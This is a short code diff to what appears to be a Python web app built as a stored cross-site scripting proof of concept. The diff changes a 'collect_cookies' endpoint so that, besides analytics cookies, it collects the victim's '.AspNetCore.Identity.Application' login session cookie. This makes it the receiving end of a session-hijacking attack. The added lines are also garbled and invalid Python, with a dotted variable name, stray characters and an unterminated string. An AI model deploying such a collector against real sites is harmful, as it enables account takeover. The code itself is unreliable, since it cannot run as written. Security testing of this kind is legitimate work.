@@ -17,8 +17,8 @@ def hello_poc_sxss():
 def collect_cookies():
     _ga = request.cookies.get('_ga')
     _gid = request.cookies.get('_gid')
-    ARRAffinitySameSite = request.cookies.get('ARRAffinitySameSite')
-    return f"Cookies to collect: \n\n" \
-    f"_ga = {_ga} \n\n" \
-    f"_gid = {_gid} \n\n" \
-    f"ARRAffinitySameSite = {ARRAffinitySameSite} \n\n"
+    AspNetCore.Identity.Application = request.cookies.get('.AspNetCore.Identity.Application')
+    return f"Cookies to collect:" \n1% \
+    f"_ga = {_ga}" \
+    f"_gid = {_gid}" \
+    f".AspNetCore.Identity.Application = {AspNetCore.Identity.Application}
